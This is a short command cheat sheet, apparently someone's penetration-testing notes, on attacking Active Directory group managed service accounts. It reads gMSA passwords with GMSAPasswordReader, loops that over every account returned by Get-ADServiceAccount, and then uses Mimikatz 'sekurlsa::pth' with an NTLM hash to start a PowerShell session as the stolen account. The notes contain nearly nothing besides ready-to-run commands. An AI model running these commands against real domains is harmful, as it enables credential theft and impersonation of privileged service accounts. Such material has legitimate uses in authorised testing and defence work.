### Using the [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) tool. 
#### Executing GMSAPasswordReader
```cmd
GMSAPasswordReader.exe --accountname <ACCOUNT-NAME>
```
![[Pasted image 20251229191757.png]]
#### You enumerate all gMSA accounts first, then loop over them:
```powershell
Get-ADServiceAccount -Filter * | ForEach-Object {
    .\GMSAPasswordReader.exe --accountname $_.Name
}
```
#### Using `Mimikatz` to perform `OverPass-the-Hash`:
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<ACCOUNT-NAME> /domain:domain.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit
```

